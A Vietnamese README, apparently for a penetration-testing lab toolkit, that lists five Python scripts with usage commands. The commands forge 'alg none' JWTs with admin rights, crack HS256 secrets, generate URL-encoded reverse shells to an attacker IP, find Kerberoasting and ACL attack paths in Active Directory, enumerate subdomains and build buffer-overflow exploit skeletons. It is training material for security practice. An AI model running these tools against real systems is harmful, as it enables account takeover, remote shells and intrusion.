# BỘ CÔNG CỤ TÁC CHIẾN THỰC HÀNH (CYBERSECURITY ARSENAL SCRIPTS)

> **Mã hiệu:** `SEC-ARSENAL-SCRIPTS-2026`  
> **Mục đích:** Cung cấp các công cụ dòng lệnh chuyên dụng viết bằng Python 3.11 thuần (chuẩn thư viện chuẩn, không bloatware) phục vụ phân tích token JWT, sinh reverse shell đa nền tảng và phân tích đường dẫn tấn công Active Directory trong phòng lab.
>
> **Liên kết điều phối:** Xem [DIEU_PHOI_LO_TRINH_DOC.md](file:///mnt/second_drive/DOCS/SEC/DIEU_PHOI_LO_TRINH_DOC.md) | [labs/README.md](file:///mnt/second_drive/DOCS/SEC/labs/README.md).

---

## DANH MỤC CÔNG CỤ VÀ HƯỚNG DẪN SỬ DỤNG

### 1. Trình phân tích & Giả mạo JWT (`jwt_tool_lite.py`)
- **Tập tin:** [`scripts/arsenal/jwt_tool_lite.py`](file:///mnt/second_drive/DOCS/SEC/scripts/arsenal/jwt_tool_lite.py)
- **Tính năng:**
  - Giải mã cấu trúc Header & Payload, kiểm tra thời hạn hết hạn (`exp`).
  - Khai thác lỗ hổng xác thực thuật toán `none` (CVE-2015-9235), ghi đè tham số `is_admin: true`.
  - Tấn công vét cạn chìa khóa bí mật HMAC-SHA256 (HS256) bằng từ điển mật khẩu.
- **Cú pháp thực thi:**
  ```bash
  # Giải mã và xem chi tiết token
  /usr/bin/python3.11 scripts/arsenal/jwt_tool_lite.py decode "<JWT_TOKEN>"

  # Sinh token giả mạo với thuật toán none và cấp quyền admin
  /usr/bin/python3.11 scripts/arsenal/jwt_tool_lite.py forge-none "<JWT_TOKEN>" --set '{"is_admin": true, "role": "admin"}'

  # Bẻ khóa bí mật HS256
  /usr/bin/python3.11 scripts/arsenal/jwt_tool_lite.py crack "<JWT_TOKEN>" /usr/share/wordlists/rockyou.txt
  ```

---

### 2. Trình tạo Reverse Shell đa nền tảng (`reverse_shell_generator.py`)
- **Tập tin:** [`scripts/arsenal/reverse_shell_generator.py`](file:///mnt/second_drive/DOCS/SEC/scripts/arsenal/reverse_shell_generator.py)
- **Tính năng:**
  - Hỗ trợ tạo payload kết nối ngược cho 7 nền tảng: Bash (`/dev/tcp` & `mkfifo`), PowerShell (Base64 UTF-16LE), Python 3 PTY, Netcat, PHP, Socat.
  - Tích hợp cờ mã hóa URL (`--url-encode`) dùng cho khai thác Web Parameter Injection và Base64 (`--base64-encode`).
- **Cú pháp thực thi:**
  ```bash
  # Sinh toàn bộ các loại shell cho IP Attacker và Port chỉ định
  /usr/bin/python3.11 scripts/arsenal/reverse_shell_generator.py --ip 10.10.14.5 --port 4444

  # Chỉ sinh lệnh PowerShell Base64
  /usr/bin/python3.11 scripts/arsenal/reverse_shell_generator.py --ip 10.10.14.5 --port 4444 --type powershell_b64

  # Sinh Bash shell và URL-encode để chèn vào HTTP GET query
  /usr/bin/python3.11 scripts/arsenal/reverse_shell_generator.py --ip 10.10.14.5 --port 4444 --type bash_tcp --url-encode
  ```

---

### 3. Trình phân tích đường dẫn leo quyền Active Directory (`ad_bloodhound_analyzer.py`)
- **Tập tin:** [`scripts/arsenal/ad_bloodhound_analyzer.py`](file:///mnt/second_drive/DOCS/SEC/scripts/arsenal/ad_bloodhound_analyzer.py)
- **Tính năng:**
  - Phân tích danh sách đối tượng người dùng: phát hiện tài khoản có SPN (mục tiêu Kerberoasting), tài khoản tắt Pre-Auth (`DONT_REQ_PREAUTH` - mục tiêu AS-REP Roasting), và ủy quyền không ràng buộc (Unconstrained Delegation).
  - Phân tích quan hệ ACL nguy hiểm: `GenericAll`, `WriteDacl`, `ForceChangePassword`, `AddMember`.
- **Cú pháp thực thi:**
  ```bash
  # Chạy phân tích với dữ liệu mẫu mô phỏng
  /usr/bin/python3.11 scripts/arsenal/ad_bloodhound_analyzer.py

  # Chạy phân tích tệp JSON xuất từ BloodHound thực tế
  /usr/bin/python3.11 scripts/arsenal/ad_bloodhound_analyzer.py --json-file bloodhound_export.json
  ```

---

### 4. Trình thu thập tên miền con thụ động (`subdomain_recon_lite.py`)
- **Tập tin:** [`scripts/arsenal/subdomain_recon_lite.py`](file:///mnt/second_drive/DOCS/SEC/scripts/arsenal/subdomain_recon_lite.py)
- **Tính năng:**
  - Truy vấn nhật ký minh bạch chứng chỉ số (Certificate Transparency Logs) qua public API `crt.sh`.
  - Phân giải địa chỉ IP tự động bằng thư viện chuẩn `socket` của Python mà không cần cài thêm thư viện ngoài.
- **Cú pháp thực thi:**
  ```bash
  # Thu thập subdomain của tên miền mục tiêu
  /usr/bin/python3.11 scripts/arsenal/subdomain_recon_lite.py example.com --resolve

  # Chạy chế độ demo ngoại tuyến
  /usr/bin/python3.11 scripts/arsenal/subdomain_recon_lite.py target.corp --demo
  ```

---

### 5. Bộ công cụ tự động hóa khai thác Tràn bộ đệm x86 (`buffer_overflow_fuzzer.py`)
- **Tập tin:** [`scripts/arsenal/buffer_overflow_fuzzer.py`](file:///mnt/second_drive/DOCS/SEC/scripts/arsenal/buffer_overflow_fuzzer.py)
- **Tính năng:**
  - Sinh chuỗi mẫu tuần hoàn (Cyclic Pattern) tương đương công cụ Metasploit `pattern_create.rb`.
  - Định vị chính xác độ lệch (Offset) ghi đè thanh ghi EIP tương đương `pattern_offset.rb`.
  - Tự động sinh mảng ký tự xấu (Badchars) và xuất khung mã khai thác Python 3 hoàn chỉnh.
- **Cú pháp thực thi:**
  ```bash
  # 1. Sinh chuỗi mẫu 2500 bytes để làm crash dịch vụ
  /usr/bin/python3.11 scripts/arsenal/buffer_overflow_fuzzer.py pattern-create 2500

  # 2. Tìm offset từ giá trị EIP crash (ví dụ: 0x39694438)
  /usr/bin/python3.11 scripts/arsenal/buffer_overflow_fuzzer.py pattern-offset 0x39694438

  # 3. Xuất mảng badchars loại trừ byte \x00
  /usr/bin/python3.11 scripts/arsenal/buffer_overflow_fuzzer.py badchars --exclude 00,0a

  # 4. Xuất khung mã khai thác hoàn chỉnh
  /usr/bin/python3.11 scripts/arsenal/buffer_overflow_fuzzer.py skeleton --ip 192.168.1.50 --port 9999 --offset 2003
  ```
